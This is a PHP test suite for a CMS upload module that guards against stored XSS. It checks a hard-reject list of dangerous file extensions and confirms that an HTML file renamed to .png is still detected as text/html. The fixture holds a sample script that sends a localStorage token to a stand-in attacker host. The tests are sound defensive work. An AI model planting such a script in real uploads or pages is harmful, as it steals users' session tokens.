<?php

declare(strict_types=1);

use plugin\cccms\support\storage\StorageDriver;

return static function (): void {
    suite('上传安全（P0-2 存储型 XSS 防线）');

    test('危险扩展名在硬拒绝名单中（不受后台白名单影响）', function (): void {
        foreach (['svg', 'svgz', 'html', 'htm', 'xhtml', 'shtml', 'xml', 'xsl', 'mhtml'] as $ext) {
            ok(
                in_array($ext, StorageDriver::DANGEROUS_EXT, true),
                "{$ext} 应被 DANGEROUS_EXT 硬拒绝"
            );
        }
        // 正常的图片扩展名不允许进入危险名单（防止误伤）
        ok(!in_array('png', StorageDriver::DANGEROUS_EXT, true), 'png 不应被误判为危险类型');
    });

    test('把 HTML 脚本改名为 .png，魔数识别仍是 text/html（证明校验前提成立）', function (): void {
        if (!class_exists(\finfo::class)) {
            Suite::$skipped++;
            echo '  ' . Suite::color('○ 跳过', 'gray') . " 魔数校验（缺少 finfo 扩展）\n";
            return;
        }

        $tmp = tempnam(sys_get_temp_dir(), 'cccms-magic-');
        file_put_contents($tmp, "<html><script>fetch('https://evil.example/?c='+localStorage.getItem('token'))</script></html>");
        $mime = (string)(new \finfo(FILEINFO_MIME_TYPE))->file($tmp);
        unlink($tmp);

        same('text/html', $mime, 'HTML 内容即使命名为 .png，finfo 也应识别为 text/html');
    });
};